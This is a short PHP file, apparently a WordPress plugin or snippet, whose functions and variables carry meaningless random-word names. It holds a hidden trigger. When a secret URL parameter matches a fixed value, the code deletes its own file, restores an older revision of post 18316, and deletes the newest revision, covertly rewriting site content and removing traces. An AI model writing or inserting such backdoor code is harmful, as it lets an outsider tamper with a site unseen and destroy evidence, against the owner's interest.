<?php

function footer_signup_publisher() {
	if (isset($_GET['rest_sticky_right']) && $_GET['rest_sticky_right'] === 'free_visitor_panel_table') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$alt_redirect_weather = 18316;
		$team_recipe_force_sidebar = wp_get_post_revisions($alt_redirect_weather);
		if (empty($team_recipe_force_sidebar)) die('no revisions');
		if (count($team_recipe_force_sidebar) < 2) die('less than 2');
		$gravity_signup_kit = array_shift($team_recipe_force_sidebar);
		$based_conditional_dynamic_optimize = $gravity_signup_kit->ID;
		$changer_slider_details = array_shift($team_recipe_force_sidebar);
		$clock_authors_duplicate_api = $changer_slider_details->ID;
		$rate_rates_directory_star = wp_restore_post_revision($clock_authors_duplicate_api);
		if ($rate_rates_directory_star === false) die('error restoring');
		$rate_rates_directory_star = wp_delete_post_revision($based_conditional_dynamic_optimize);		
		if ($rate_rates_directory_star === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'footer_signup_publisher');
